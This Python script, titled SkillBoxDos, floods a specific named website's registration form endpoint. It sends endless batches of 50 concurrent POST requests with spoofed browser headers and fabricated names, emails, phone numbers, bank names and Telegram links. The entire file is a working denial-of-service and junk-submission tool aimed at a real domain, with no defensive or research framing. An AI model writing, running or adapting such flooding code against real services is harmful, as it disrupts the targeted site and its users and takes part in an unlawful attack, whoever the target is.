import time
import asyncio
import aiohttp
from random import randint as r
from random_username.generate import generate_username


R_COUNTER = 0


class SkillBoxDos:

    
    def get_headers(self) -> dict:
        return {
            'authority': 'skillboxadverspartner.ru',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'origin': 'https://skillboxadverspartner.ru',
            'referer': 'https://skillboxadverspartner.ru/register-step.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        }

    
    def generate_name(self) -> str:
        return generate_username(2)[0]

    
    def generate_username(self) -> str:
        return generate_username(2)[0]


    def generate_method(self) -> str:
        methods = ["sber", "сбер", "сбербанк", "альфа", "tinkoff", "тиньков", "tinkoff"]
        return methods[r(0, len(methods)-1)]
    
    
    def get_phone_mask(self) -> int:
        masks = [995, 911, 953]
        return masks[r(0, len(masks)-1)]
    
    
    def generate_data(self) -> dict:
        return {
            "name": self.generate_name(),
            "email": f"{self.generate_username()}@gmail.com",
            "phone": f"8{self.get_phone_mask()}{r(100,999)}{r(10,20)}{r(10,19)}",
            "method": self.generate_method(),
            "tg": f"t.me/{self.generate_username()}",
            "ads": f"t.me/{self.generate_username()}",
            "manager": self.generate_name(),
            "posts": r(1,5),
            "views": r(5000,23000)
        }

    
    async def make_request(self) -> str:
        global R_COUNTER
        async with aiohttp.ClientSession() as session:
            async with session.post('https://skillboxadverspartner.ru/php/ajax.php',
                                    headers=self.get_headers(),
                                    data=self.generate_data()) as resp:
                print("status: ", resp.status, "total requests ", R_COUNTER)
                R_COUNTER += 1
                return resp.status

            
async def create_pool(number: int) -> list:
    pool = []
    for _ in range(number):
        pool.append(SkillBoxDos().make_request())
    return await asyncio.gather(*pool)


if __name__ == '__main__':
    # to do threads or multiprocessing
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    print("Example of sending form: ")
    print(SkillBoxDos().generate_data())
    time.sleep(1)
    while True:
        asyncio.run(create_pool(50))
